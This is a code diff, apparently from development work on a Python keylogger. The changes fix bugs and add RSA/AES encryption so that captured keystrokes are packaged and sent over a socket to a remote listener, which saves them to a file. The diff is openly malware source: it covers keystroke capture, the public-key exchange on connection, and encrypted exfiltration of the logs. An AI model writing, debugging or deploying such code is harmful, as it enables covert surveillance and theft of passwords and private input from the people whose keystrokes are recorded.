@@ -8,7 +8,7 @@ import zlib
 import base64
 from Cryptodome.Cipher import AES, PKCS1_OAEP
 from Cryptodome.PublicKey import RSA
-from Cryptodome.random import get_random_bytes
+from Cryptodome.Random import get_random_bytes
 from io import BytesIO
 from datetime import datetime
 
@@ -40,7 +40,6 @@ class Keylogger:
 
         self.log += name
 
-    # TODO bump out socket connection to initialize function
     def init_conn(self):
         # Check if there is already a socket connection, if there is, do nothing
         try:
@@ -49,6 +48,7 @@ class Keylogger:
             print("Error on socket creation")
             sys.exit(1)
 
+        # TODO listener will reply with the public key, need to make logic to save it
         self.socket.send("REQ_PUB".encode())
 
 
@@ -62,9 +62,8 @@ class Keylogger:
 
             # If there is keystrokes to send, send them :^)
             if self.log:
-                self.socket.send(f"\n--- New Log Instance @ {self.time} ---\n".encode())
-                self.socket.send(self.log.encode())
-                self.socket.send(f"\n--- End Of Log Instance @ {self.end_time} ---\n".encode())
+                payload = f"\n--- New Log Instance @ {self.time} ---\n{self.log}\n--- End Of Log Instance @ {self.end_time} ---\n"
+                self.socket.send(self.encrypt(payload).encode())
 
         self.log = ""
 
@@ -80,14 +79,14 @@ class Keylogger:
     def generate_keys(self):
         new_key = RSA.generate(2048)
         self.private_key = new_key.exportKey()
-        self.public_key = new_key.publicKey().exportKey()
+        self.public_key = new_key.publickey().exportKey()
 
     def get_rsa_cipher(key):
         rsakey = RSA.importKey(key)
         return (PKCS1_OAEP.new(rsakey), rsakey.size_in_byes())
 
     def encrypt(self, plaintext):
-        compressed_text = zlib.compress(plaintext)
+        compressed_text = zlib.compress(plaintext.encode())
 
         session_key = get_random_bytes(16)
         cipher_aes = AES.new(session_key, AES.MODE_EAX)
@@ -116,7 +115,6 @@ class Keylogger:
         plaintext = zlib.decompress(decrypted)
         return plaintext
 
-    # TODO Transfer keys on initial connnection
     # For the listener - handle a received a conncetion
     def handle(self, client_socket):
         print("[+] Receieved Connection")
@@ -129,8 +127,11 @@ class Keylogger:
             else:
                 break
 
+            # TODO Transfer keys on initial connnection
             if buf.decode() == "REQ_PUB":
-                client_socket.send(self.public_key.encode())
+                print("Received REQ_PUB")
+                client_socket.send(self.public_key)
+                buf=b""
             else:
                 with open(self.args.outfile, "w") as f:
                     f.write(buf.decode())
@@ -146,7 +147,6 @@ class Keylogger:
         # When there is a connection
         while True:
             client_socket, _ = self.socket.accept()
-            client_socket.send(self.private_key.encode())
             client_thread = threading.Thread(target=self.handle, args=(client_socket,))
             client_thread.start()
 
